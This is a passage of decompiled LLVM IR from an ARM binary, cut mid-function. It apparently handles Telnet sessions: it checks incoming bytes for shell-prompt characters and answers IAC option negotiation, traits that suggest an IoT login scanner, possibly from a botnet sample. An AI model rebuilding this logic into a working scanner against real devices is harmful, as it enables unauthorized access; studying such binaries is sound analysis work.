  store i32 %v3_f1c8, i32* %r2.global-to-local, align 4
  %v1_f1cc = add i32 %v3_f1c8, -1
  store i32 %v1_f1cc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1d0 = icmp eq i32 %v1_f1cc, 0
  store i1 %v2_f1d0, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f1cc, 1
  br i1 %tmp430, label %dec_label_pc_ef34.backedge.thread, label %dec_label_pc_f1d8

dec_label_pc_f1d8:                                ; preds = %dec_label_pc_f1c8
  %v2_f1d8 = add i32 %v1_f1cc, %v0_efb0
  store i32 %v2_f1d8, i32* %r3.global-to-local, align 4
  %v1_f1dc = add i32 %v2_f1d8, 28
  %v2_f1dc = inttoptr i32 %v1_f1dc to i8*
  %v3_f1dc = load i8, i8* %v2_f1dc, align 1
  %v4_f1dc = zext i8 %v3_f1dc to i32
  store i32 %v4_f1dc, i32* %r3.global-to-local, align 4
  %v2_f1e0 = icmp ugt i8 %v3_f1dc, 61
  store i1 %v2_f1e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1e0 = icmp eq i8 %v3_f1dc, 62
  store i1 %v7_f1e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1e0, label %dec_label_pc_f244, label %bb431

bb431:                                            ; preds = %dec_label_pc_f1d8
  %v3_f1e4 = icmp ugt i8 %v3_f1dc, 57
  store i1 %v3_f1e4, i1* %cpsr_c.global-to-local, align 1
  %v8_f1e4 = icmp eq i8 %v3_f1dc, 58
  store i1 %v8_f1e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1e4, label %dec_label_pc_f244, label %dec_label_pc_f1ec

dec_label_pc_f1ec:                                ; preds = %bb431
  %v2_f1ec = icmp ugt i8 %v3_f1dc, 35
  store i1 %v2_f1ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f1ec = icmp eq i8 %v3_f1dc, 36
  store i1 %v7_f1ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1ec, label %dec_label_pc_f244, label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1ec
  %v2_f1f4 = icmp ugt i8 %v3_f1dc, 34
  store i1 %v2_f1f4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f4 = icmp eq i8 %v3_f1dc, 35
  store i1 %v7_f1f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1f4, label %dec_label_pc_f244, label %dec_label_pc_f1fc

dec_label_pc_f1fc:                                ; preds = %dec_label_pc_f1f4
  %v2_f1fc = icmp ugt i8 %v3_f1dc, 36
  store i1 %v2_f1fc, i1* %cpsr_c.global-to-local, align 1
  %v7_f1fc = icmp eq i8 %v3_f1dc, 37
  store i1 %v7_f1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1fc, label %dec_label_pc_f244, label %dec_label_pc_f22c.preheader

dec_label_pc_f22c.preheader:                      ; preds = %dec_label_pc_f1fc
  %v3_f200 = add i32 %v0_efb0, 28
  %v2_f204 = add i32 %v3_f200, %v3_f1c8
  store i32 %v2_f204, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f22c

dec_label_pc_f210:                                ; preds = %bb432
  %v2_f210 = icmp ugt i8 %v3_f234, 35
  store i1 %v2_f210, i1* %cpsr_c.global-to-local, align 1
  %v7_f210 = icmp eq i8 %v3_f234, 36
  store i1 %v7_f210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f210, label %dec_label_pc_f244, label %dec_label_pc_f218

dec_label_pc_f218:                                ; preds = %dec_label_pc_f210
  %v2_f218 = icmp ugt i8 %v3_f234, 34
  store i1 %v2_f218, i1* %cpsr_c.global-to-local, align 1
  %v7_f218 = icmp eq i8 %v3_f234, 35
  store i1 %v7_f218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f218, label %dec_label_pc_f244, label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f218
  %v2_f220 = icmp ugt i8 %v3_f234, 36
  store i1 %v2_f220, i1* %cpsr_c.global-to-local, align 1
  %v7_f220 = icmp eq i8 %v3_f234, 37
  store i1 %v7_f220, i1* %cpsr_z.global-to-local, align 1
  %v1_f224 = add i32 %v0_f224, -1
  store i32 %v1_f224, i32* %r3.global-to-local, align 4
  br i1 %v7_f220, label %dec_label_pc_f244, label %dec_label_pc_f22c

dec_label_pc_f22c:                                ; preds = %dec_label_pc_f22c.preheader, %dec_label_pc_f220
  %v0_f224 = phi i32 [ %v2_f204, %dec_label_pc_f22c.preheader ], [ %v1_f224, %dec_label_pc_f220 ]
  %v0_f22c = phi i32 [ %v1_f1cc, %dec_label_pc_f22c.preheader ], [ %v1_f22c, %dec_label_pc_f220 ]
  %v1_f22c = add i32 %v0_f22c, -1
  store i32 %v1_f22c, i32* %r1.global-to-local, align 4
  %v2_f22c = icmp ne i32 %v0_f22c, 0
  store i1 %v2_f22c, i1* %cpsr_c.global-to-local, align 1
  %v7_f22c = icmp eq i32 %v0_f22c, 1
  store i1 %v7_f22c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f22c, label %dec_label_pc_ef34.backedge.thread561, label %dec_label_pc_f234

dec_label_pc_f234:                                ; preds = %dec_label_pc_f22c
  %v1_f234 = add i32 %v0_f224, -2
  %v2_f234 = inttoptr i32 %v1_f234 to i8*
  %v3_f234 = load i8, i8* %v2_f234, align 1
  %v4_f234 = zext i8 %v3_f234 to i32
  store i32 %v4_f234, i32* %r2.global-to-local, align 4
  %v2_f238 = icmp ugt i8 %v3_f234, 61
  store i1 %v2_f238, i1* %cpsr_c.global-to-local, align 1
  %v7_f238 = icmp eq i8 %v3_f234, 62
  store i1 %v7_f238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f238, label %dec_label_pc_f244, label %bb432

bb432:                                            ; preds = %dec_label_pc_f234
  %v3_f23c = icmp ugt i8 %v3_f234, 57
  store i1 %v3_f23c, i1* %cpsr_c.global-to-local, align 1
  %v8_f23c = icmp eq i8 %v3_f234, 58
  store i1 %v8_f23c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f23c, label %dec_label_pc_f244, label %dec_label_pc_f210

dec_label_pc_f244:                                ; preds = %dec_label_pc_f234, %bb432, %dec_label_pc_f220, %dec_label_pc_f218, %dec_label_pc_f210, %dec_label_pc_f1fc, %dec_label_pc_f1d8, %dec_label_pc_f1f4, %dec_label_pc_f1ec, %bb431
  %v0_f248 = phi i32 [ %v1_f1cc, %dec_label_pc_f1fc ], [ %v1_f1cc, %dec_label_pc_f1d8 ], [ %v1_f1cc, %dec_label_pc_f1f4 ], [ %v1_f1cc, %dec_label_pc_f1ec ], [ %v1_f1cc, %bb431 ], [ %v1_f22c, %dec_label_pc_f210 ], [ %v1_f22c, %dec_label_pc_f218 ], [ %v1_f22c, %dec_label_pc_f220 ], [ %v1_f22c, %bb432 ], [ %v1_f22c, %dec_label_pc_f234 ]
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f248 = add i32 %v0_f248, 1
  store i32 %v1_f248, i32* @r7, align 4
  %v1_f24c = call i32 @function_fd60(i32 9)
  store i32 %v2_f7e4, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f25c = call i32 @function_fc9c(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f25c, i32* %r0.global-to-local, align 4
  %v3_f260 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f260, i32* %r2.global-to-local, align 4
  store i32 %v3_f25c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f26c = load i32, i32* @r6, align 4
  %v1_f26c = add i32 %v0_f26c, 4
  %v2_f26c = inttoptr i32 %v1_f26c to i32*
  %v3_f26c = load i32, i32* %v2_f26c, align 4
  store i32 %v3_f26c, i32* %r0.global-to-local, align 4
  %v4_f270 = call i32 @function_11528(i32 %v3_f26c, i32 %v3_f25c, i32 %v3_f260, i32 16384)
  store i32 %v4_f270, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f280 = load i32, i32* @r6, align 4
  %v1_f280 = add i32 %v0_f280, 4
  %v2_f280 = inttoptr i32 %v1_f280 to i32*
  %v3_f280 = load i32, i32* %v2_f280, align 4
  store i32 %v3_f280, i32* %r0.global-to-local, align 4
  %v4_f284 = call i32 @function_11528(i32 %v3_f280, i32 ptrtoint ([3 x i8]* @global_var_16214.187 to i32), i32 2, i32 16384)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f28c = call i32 @function_fcc0(i32 9)
  store i32 %v1_f28c, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_f294 = load i32, i32* @r6, align 4
  %v2_f294 = add i32 %v1_f294, 12
  %v3_f294 = inttoptr i32 %v2_f294 to i32*
  store i32 9, i32* %v3_f294, align 4
  br label %dec_label_pc_f0cc

dec_label_pc_f29c:                                ; preds = %dec_label_pc_efb0
  %v1_f29c = add i32 %v0_efb0, 24
  %v2_f29c = inttoptr i32 %v1_f29c to i32*
  %v3_f29c = load i32, i32* %v2_f29c, align 4
  store i32 %v3_f29c, i32* %r1.global-to-local, align 4
  %v0_f2a0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f2a0, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_f2a8166 = icmp eq i32 %v3_f29c, 0
  store i1 %v3_f2a8166, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f2a8166, i1* %cpsr_z.global-to-local, align 1
  %v6_f2ac173 = icmp sgt i32 %v3_f29c, 0
  br i1 %v6_f2ac173, label %dec_label_pc_f2b0.preheader, label %dec_label_pc_f35c

dec_label_pc_f2a8.loopexit:                       ; preds = %dec_label_pc_f2cc
  %v2_f2d4 = add i32 %v1_f2d4, 2
  store i32 %v2_f2d4, i32* @r4, align 4
  %v2_f2d8 = add i32 %v1_f2d8, 2
  store i32 %v2_f2d8, i32* @r7, align 4
  %v3_f2a8 = icmp uge i32 %v2_f2d8, %v1_f2a8
  store i1 %v3_f2a8, i1* %cpsr_c.global-to-local, align 1
  %v9_f2a8 = icmp eq i32 %v2_f2d8, %v1_f2a8
  store i1 %v9_f2a8, i1* %cpsr_z.global-to-local, align 1
  %v6_f2ac = icmp slt i32 %v2_f2d8, %v1_f2a8
  br i1 %v6_f2ac, label %dec_label_pc_f2b0.preheader, label %dec_label_pc_f35c

dec_label_pc_f2b0.preheader:                      ; preds = %dec_label_pc_f29c, %dec_label_pc_f2a8.loopexit
  %v6_f364273 = phi i32 [ %v6_f364274, %dec_label_pc_f2a8.loopexit ], [ %v0_efb0, %dec_label_pc_f29c ]
  %v1_f2d8262 = phi i32 [ %v2_f2d8, %dec_label_pc_f2a8.loopexit ], [ 0, %dec_label_pc_f29c ]
  %v1_f2bc260 = phi i32 [ %v1_f2a8, %dec_label_pc_f2a8.loopexit ], [ %v3_f29c, %dec_label_pc_f29c ]
  %v0_f2b0258 = phi i32 [ %v2_f2d4, %dec_label_pc_f2a8.loopexit ], [ %v0_f2a0, %dec_label_pc_f29c ]
  br label %dec_label_pc_f2b0

dec_label_pc_f2b0:                                ; preds = %dec_label_pc_f2b0.preheader, %dec_label_pc_f340
  %v6_f364274 = phi i32 [ %v6_f364273, %dec_label_pc_f2b0.preheader ], [ %v0_f348, %dec_label_pc_f340 ]
  %v1_f2d8 = phi i32 [ %v1_f2d8262, %dec_label_pc_f2b0.preheader ], [ %v1_f34c, %dec_label_pc_f340 ]
  %v1_f2a8 = phi i32 [ %v1_f2bc260, %dec_label_pc_f2b0.preheader ], [ %v3_f348, %dec_label_pc_f340 ]
  %v1_f2d4 = phi i32 [ %v0_f2b0258, %dec_label_pc_f2b0.preheader ], [ %v1_f354, %dec_label_pc_f340 ]
  %v1_f2b0 = inttoptr i32 %v1_f2d4 to i8*
  %v2_f2b0 = load i8, i8* %v1_f2b0, align 1
  %v3_f2b0 = zext i8 %v2_f2b0 to i32
  store i32 %v3_f2b0, i32* @r3, align 4
  %v2_f2b4 = icmp eq i8 %v2_f2b0, -1
  store i1 %v2_f2b4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2b4, label %dec_label_pc_f2bc, label %dec_label_pc_f35c

dec_label_pc_f2bc:                                ; preds = %dec_label_pc_f2b0
  %v0_f2bc = load i32, i32* %sb.global-to-local, align 4
  %v2_f2bc = add i32 %v0_f2bc, %v1_f2a8
  store i32 %v2_f2bc, i32* %r2.global-to-local, align 4
  %v1_f2c0 = add i32 %v1_f2d4, 1
  store i32 %v1_f2c0, i32* @r5, align 4
  %v3_f2c4 = icmp uge i32 %v2_f2bc, %v1_f2c0
  store i1 %v3_f2c4, i1* %cpsr_c.global-to-local, align 1
  %v9_f2c4 = icmp eq i32 %v2_f2bc, %v1_f2c0
  store i1 %v9_f2c4, i1* %cpsr_z.global-to-local, align 1
  %v2_f2c8 = xor i1 %v3_f2c4, true
  %v3_f2c8 = or i1 %v9_f2c4, %v2_f2c8
  br i1 %v3_f2c8, label %dec_label_pc_f35c, label %dec_label_pc_f2cc

dec_label_pc_f2cc:                                ; preds = %dec_label_pc_f2bc
  %v2_f2cc = inttoptr i32 %v1_f2c0 to i8*
  %v3_f2cc = load i8, i8* %v2_f2cc, align 1
  %v4_f2cc = zext i8 %v3_f2cc to i32
  store i32 %v4_f2cc, i32* @r3, align 4
  %v2_f2d0 = icmp eq i8 %v3_f2cc, -1
  store i1 %v2_f2d0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2d0, label %dec_label_pc_f2a8.loopexit, label %dec_label_pc_f2e0

dec_label_pc_f2e0:                                ; preds = %dec_label_pc_f2cc
  %v2_f2e0 = icmp ugt i8 %v3_f2cc, -4
  store i1 %v2_f2e0, i1* %cpsr_c.global-to-local, align 1
  %v7_f2e0 = icmp eq i8 %v3_f2cc, -3
  store i1 %v7_f2e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2e0, label %dec_label_pc_f874, label %dec_label_pc_f2e8

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f2e0
  %v1_f2e8 = add i32 %v1_f2d4, 2
  store i32 %v1_f2e8, i32* @r3, align 4
  %v3_f2ec = icmp uge i32 %v2_f2bc, %v1_f2e8
  store i1 %v3_f2ec, i1* %cpsr_c.global-to-local, align 1
  %v9_f2ec = icmp eq i32 %v2_f2bc, %v1_f2e8
  store i1 %v9_f2ec, i1* %cpsr_z.global-to-local, align 1
  %v2_f2f0 = xor i1 %v3_f2ec, true
  %v3_f2f0 = or i1 %v9_f2ec, %v2_f2f0
  br i1 %v3_f2f0, label %dec_label_pc_f35c, label %dec_label_pc_f2f4

dec_label_pc_f2f4:                                ; preds = %dec_label_pc_f8d8, %bb454, %.thread138, %dec_label_pc_f2e8
  %v0_f2f4 = load i32, i32* @r5, align 4
  %v1_f2f4 = inttoptr i32 %v0_f2f4 to i8*
  %v2_f2f4 = load i8, i8* %v1_f2f4, align 1
  %v3_f2f4 = zext i8 %v2_f2f4 to i32
  store i32 %v3_f2f4, i32* %r3.global-to-local, align 4
  %v2_f2f8 = icmp ugt i8 %v2_f2f4, -4
  store i1 %v2_f2f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f2f8 = icmp eq i8 %v2_f2f4, -3
  store i1 %v7_f2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2f8, label %.thread96, label %dec_label_pc_f308

.thread96:                                        ; preds = %dec_label_pc_f2f4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f2f4, align 1
  %v0_f304.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f304.pr.pr, label %.thread99, label %.thread96.dec_label_pc_f308thread-pre-split_crit_edge

.thread96.dec_label_pc_f308thread-pre-split_crit_edge: ; preds = %.thread96
  %v0_f308.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f308

dec_label_pc_f308:                                ; preds = %dec_label_pc_f2f4, %.thread96.dec_label_pc_f308thread-pre-split_crit_edge
  %v0_f308.pr = phi i32 [ %v0_f308.pr.pre, %.thread96.dec_label_pc_f308thread-pre-split_crit_edge ], [ %v3_f2f4, %dec_label_pc_f2f4 ]
  %v2_f308 = icmp ugt i32 %v0_f308.pr, 250
  store i1 %v2_f308, i1* %cpsr_c.global-to-local, align 1
  %v7_f308 = icmp eq i32 %v0_f308.pr, 251
  store i1 %v7_f308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f308, label %bb433, label %.thread99

bb433:                                            ; preds = %dec_label_pc_f308
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f310 = load i32, i32* @r5, align 4
  %v4_f310 = inttoptr i32 %v3_f310 to i8*
  store i8 -3, i8* %v4_f310, align 1
  br label %.thread99

.thread99:                                        ; preds = %dec_label_pc_f308, %.thread96, %bb433
  %v0_f314 = load i32, i32* @r4, align 4
  %v1_f314 = add i32 %v0_f314, 2
  %v2_f314 = inttoptr i32 %v1_f314 to i8*
  %v3_f314 = load i8, i8* %v2_f314, align 1
  %v4_f314 = zext i8 %v3_f314 to i32
  store i32 %v4_f314, i32* %r3.global-to-local, align 4
  %v2_f318 = icmp ugt i8 %v3_f314, -4
  store i1 %v2_f318, i1* %cpsr_c.global-to-local, align 1
  %v7_f318 = icmp eq i8 %v3_f314, -3
  store i1 %v7_f318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f318, label %.thread100, label %dec_label_pc_f328

.thread100:                                       ; preds = %.thread99
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f314, align 1
  %v0_f324.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f324.pr.pr, label %.thread103, label %.thread100.dec_label_pc_f328thread-pre-split_crit_edge

.thread100.dec_label_pc_f328thread-pre-split_crit_edge: ; preds = %.thread100
  %v0_f328.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f328

dec_label_pc_f328:                                ; preds = %.thread99, %.thread100.dec_label_pc_f328thread-pre-split_crit_edge
  %v0_f328.pr = phi i32 [ %v0_f328.pr.pre, %.thread100.dec_label_pc_f328thread-pre-split_crit_edge ], [ %v4_f314, %.thread99 ]
  %v2_f328 = icmp ugt i32 %v0_f328.pr, 250
  store i1 %v2_f328, i1* %cpsr_c.global-to-local, align 1
  %v7_f328 = icmp eq i32 %v0_f328.pr, 251
  store i1 %v7_f328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f328, label %bb434, label %.thread103

bb434:                                            ; preds = %dec_label_pc_f328
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f330 = load i32, i32* @r4, align 4
  %v4_f330 = add i32 %v3_f330, 2
  %v5_f330 = inttoptr i32 %v4_f330 to i8*
  store i8 -3, i8* %v5_f330, align 1
  br label %.thread103

.thread103:                                       ; preds = %dec_label_pc_f328, %.thread100, %bb434
  %v0_f334 = load i32, i32* @r6, align 4
  %v1_f334 = add i32 %v0_f334, 4
  %v2_f334 = inttoptr i32 %v1_f334 to i32*
  %v3_f334 = load i32, i32* %v2_f334, align 4
  store i32 %v3_f334, i32* %r0.global-to-local, align 4
  %v0_f338 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f340

dec_label_pc_f340:                                ; preds = %dec_label_pc_f9ec, %.thread103
  %v0_f344 = phi i32 [ %v3_fa00, %dec_label_pc_f9ec ], [ %v3_f334, %.thread103 ]
  %storemerge4 = phi i32 [ %v2_f88c, %dec_label_pc_f9ec ], [ %v0_f338, %.thread103 ]
  %storemerge3 = phi i32 [ 9, %dec_label_pc_f9ec ], [ 3, %.thread103 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* @r3, align 4
  %v4_f344 = call i32 @function_11528(i32 %v0_f344, i32 %storemerge4, i32 %storemerge3, i32 16384)
  store i32 %v4_f344, i32* %r0.global-to-local, align 4
  %v0_f348 = load i32, i32* @r6, align 4
  %v1_f348 = add i32 %v0_f348, 24
  %v2_f348 = inttoptr i32 %v1_f348 to i32*
  %v3_f348 = load i32, i32* %v2_f348, align 4
  store i32 %v3_f348, i32* %r1.global-to-local, align 4
  %v0_f34c = load i32, i32* @r7, align 4
  %v1_f34c = add i32 %v0_f34c, 3
  store i32 %v1_f34c, i32* @r7, align 4
  %v3_f350 = icmp uge i32 %v1_f34c, %v3_f348
  store i1 %v3_f350, i1* %cpsr_c.global-to-local, align 1
  %v9_f350 = icmp eq i32 %v1_f34c, %v3_f348
  store i1 %v9_f350, i1* %cpsr_z.global-to-local, align 1
  %v0_f354 = load i32, i32* @r4, align 4
  %v1_f354 = add i32 %v0_f354, 3
  store i32 %v1_f354, i32* @r4, align 4
  %v5_f358 = icmp slt i32 %v1_f34c, %v3_f348
  br i1 %v5_f358, label %dec_label_pc_f2b0, label %dec_label_pc_f35c

dec_label_pc_f35c:                                ; preds = %dec_label_pc_f2a8.loopexit, %dec_label_pc_f2b0, %dec_label_pc_f340, %dec_label_pc_f2e8, %dec_label_pc_f2bc, %dec_label_pc_f29c, %dec_label_pc_f874.dec_label_pc_f35c.loopexit_crit_edge
  %v6_f364 = phi i32 [ %v0_f8a4, %dec_label_pc_f874.dec_label_pc_f35c.loopexit_crit_edge ], [ %v0_efb0, %dec_label_pc_f29c ], [ %v6_f364274, %dec_label_pc_f2b0 ], [ %v0_f348, %dec_label_pc_f340 ], [ %v6_f364274, %dec_label_pc_f2e8 ], [ %v6_f364274, %dec_label_pc_f2bc ], [ %v6_f364274, %dec_label_pc_f2a8.loopexit ]
  %v0_f35c = phi i32 [ %v0_f35c.pre.pre, %dec_label_pc_f874.dec_label_pc_f35c.loopexit_crit_edge ], [ 0, %dec_label_pc_f29c ], [ %v1_f2d8, %dec_label_pc_f2b0 ], [ %v1_f34c, %dec_label_pc_f340 ], [ %v1_f2d8, %dec_label_pc_f2e8 ], [ %v1_f2d8, %dec_label_pc_f2bc ], [ %v2_f2d8, %dec_label_pc_f2a8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f35c = icmp eq i32 %v0_f35c, 0
  store i1 %v2_f35c, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_f35c, 1
  br i1 %tmp435, label %dec_label_pc_f748, label %bb436

bb436:                                            ; preds = %dec_label_pc_f35c
  store i32 3, i32* @r3, align 4
  %v7_f364 = add i32 %v6_f364, 12
  %v8_f364 = inttoptr i32 %v7_f364 to i32*
  store i32 3, i32* %v8_f364, align 4
  br label %dec_label_pc_f748

dec_label_pc_f36c:                                ; preds = %dec_label_pc_efb0
  %v1_f36c = add i32 %v0_efb0, 24
  %v2_f36c = inttoptr i32 %v1_f36c to i32*
  %v3_f36c = load i32, i32* %v2_f36c, align 4
  store i32 %v3_f36c, i32* %r2.global-to-local, align 4
  %v1_f370 = add i32 %v3_f36c, -1
  store i32 %v1_f370, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f374 = icmp eq i32 %v1_f370, 0
  store i1 %v2_f374, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_f370, 1
  br i1 %tmp437, label %dec_label_pc_ef34.backedge.thread, label %dec_label_pc_f37c

dec_label_pc_f37c:                                ; preds = %dec_label_pc_f36c
  %v2_f37c = add i32 %v1_f370, %v0_efb0
  store i32 %v2_f37c, i32* %r3.global-to-local, align 4
  %v1_f380 = add i32 %v2_f37c, 28
  %v2_f380 = inttoptr i32 %v1_f380 to i8*
  %v3_f380 = load i8, i8* %v2_f380, align 1
  %v4_f380 = zext i8 %v3_f380 to i32
  store i32 %v4_f380, i32* %r3.global-to-local, align 4
  %v2_f384 = icmp ugt i8 %v3_f380, 61
  store i1 %v2_f384, i1* %cpsr_c.global-to-local, align 1
  %v7_f384 = icmp eq i8 %v3_f380, 62
  store i1 %v7_f384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f384, label %dec_label_pc_f3e8, label %bb438

bb438:                                            ; preds = %dec_label_pc_f37c
  %v3_f388 = icmp ugt i8 %v3_f380, 57
  store i1 %v3_f388, i1* %cpsr_c.global-to-local, align 1
  %v8_f388 = icmp eq i8 %v3_f380, 58
  store i1 %v8_f388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f388, label %dec_label_pc_f3e8, label %dec_label_pc_f390

dec_label_pc_f390:                                ; preds = %bb438
  %v2_f390 = icmp ugt i8 %v3_f380, 35
  store i1 %v2_f390, i1* %cpsr_c.global-to-local, align 1
  %v7_f390 = icmp eq i8 %v3_f380, 36
  store i1 %v7_f390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f390, label %dec_label_pc_f3e8, label %dec_label_pc_f398

dec_label_pc_f398:                                ; preds = %dec_label_pc_f390
  %v2_f398 = icmp ugt i8 %v3_f380, 34
  store i1 %v2_f398, i1* %cpsr_c.global-to-local, align 1
  %v7_f398 = icmp eq i8 %v3_f380, 35
  store i1 %v7_f398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f398, label %dec_label_pc_f3e8, label %dec_label_pc_f3a0

dec_label_pc_f3a0:                                ; preds = %dec_label_pc_f398
  %v2_f3a0 = icmp ugt i8 %v3_f380, 36
  store i1 %v2_f3a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3a0 = icmp eq i8 %v3_f380, 37
  store i1 %v7_f3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3a0, label %dec_label_pc_f3e8, label %dec_label_pc_f3d0.preheader

dec_label_pc_f3d0.preheader:                      ; preds = %dec_label_pc_f3a0
  %v3_f3a4 = add i32 %v0_efb0, 28
  %v2_f3a8 = add i32 %v3_f3a4, %v3_f36c
  store i32 %v2_f3a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f3d0

dec_label_pc_f3b4:                                ; preds = %bb439
  %v2_f3b4 = icmp ugt i8 %v3_f3d8, 35
  store i1 %v2_f3b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b4 = icmp eq i8 %v3_f3d8, 36
  store i1 %v7_f3b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3b4, label %dec_label_pc_f3e8, label %dec_label_pc_f3bc

dec_label_pc_f3bc:                                ; preds = %dec_label_pc_f3b4
  %v2_f3bc = icmp ugt i8 %v3_f3d8, 34
  store i1 %v2_f3bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3bc = icmp eq i8 %v3_f3d8, 35
  store i1 %v7_f3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3bc, label %dec_label_pc_f3e8, label %dec_label_pc_f3c4

dec_label_pc_f3c4:                                ; preds = %dec_label_pc_f3bc
  %v2_f3c4 = icmp ugt i8 %v3_f3d8, 36
  store i1 %v2_f3c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3c4 = icmp eq i8 %v3_f3d8, 37
  store i1 %v7_f3c4, i1* %cpsr_z.global-to-local, align 1
  %v1_f3c8 = add i32 %v0_f3c8, -1
  store i32 %v1_f3c8, i32* %r3.global-to-local, align 4
  br i1 %v7_f3c4, label %dec_label_pc_f3e8, label %dec_label_pc_f3d0

dec_label_pc_f3d0:                                ; preds = %dec_label_pc_f3d0.preheader, %dec_label_pc_f3c4
  %v0_f3c8 = phi i32 [ %v2_f3a8, %dec_label_pc_f3d0.preheader ], [ %v1_f3c8, %dec_label_pc_f3c4 ]
  %v0_f3d0 = phi i32 [ %v1_f370, %dec_label_pc_f3d0.preheader ], [ %v1_f3d0, %dec_label_pc_f3c4 ]
  %v1_f3d0 = add i32 %v0_f3d0, -1
  store i32 %v1_f3d0, i32* %r1.global-to-local, align 4
  %v2_f3d0 = icmp ne i32 %v0_f3d0, 0
  store i1 %v2_f3d0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3d0 = icmp eq i32 %v0_f3d0, 1
  store i1 %v7_f3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3d0, label %dec_label_pc_ef34.backedge.thread561, label %dec_label_pc_f3d8

dec_label_pc_f3d8:                                ; preds = %dec_label_pc_f3d0
  %v1_f3d8 = add i32 %v0_f3c8, -2
  %v2_f3d8 = inttoptr i32 %v1_f3d8 to i8*
  %v3_f3d8 = load i8, i8* %v2_f3d8, align 1
  %v4_f3d8 = zext i8 %v3_f3d8 to i32
  store i32 %v4_f3d8, i32* %r2.global-to-local, align 4
  %v2_f3dc = icmp ugt i8 %v3_f3d8, 61
  store i1 %v2_f3dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3dc = icmp eq i8 %v3_f3d8, 62
  store i1 %v7_f3dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3dc, label %dec_label_pc_f3e8, label %bb439

bb439:                                            ; preds = %dec_label_pc_f3d8
  %v3_f3e0 = icmp ugt i8 %v3_f3d8, 57
  store i1 %v3_f3e0, i1* %cpsr_c.global-to-local, align 1
  %v8_f3e0 = icmp eq i8 %v3_f3d8, 58
  store i1 %v8_f3e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f3e0, label %dec_label_pc_f3e8, label %dec_label_pc_f3b4

